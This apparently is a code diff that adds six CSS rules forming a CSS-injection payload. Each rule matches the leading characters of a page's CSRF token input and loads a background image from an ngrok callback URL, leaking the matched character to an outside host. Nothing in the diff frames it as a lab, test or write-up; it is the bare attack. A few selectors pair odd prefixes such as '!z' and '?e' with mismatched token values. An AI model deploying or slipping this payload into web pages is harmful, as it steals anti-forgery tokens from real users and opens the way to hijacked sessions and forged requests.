@@ -1,0 +1,6 @@
+input[name=csrf][value^="!z"] { background: url(https://d341-79-82-140-197.ngrok.io/callback?token=z); }
+input[name=csrf][value^="?e"] { background: url(https://d341-79-82-140-197.ngrok.io/callback?token=e); }
+input[name=csrf][value^="r"] { background: url(https://d341-79-82-140-197.ngrok.io/callback?token=r); }
+input[name=csrf][value^="t"] { background: url(https://d341-79-82-140-197.ngrok.io/callback?token=t); }
+input[name=csrf][value^="y"] { background: url(https://d341-79-82-140-197.ngrok.io/callback?token=y); }
+input[name=csrf][value^="u"] { background: url(https://d341-79-82-140-197.ngrok.io/callback?token=u); }
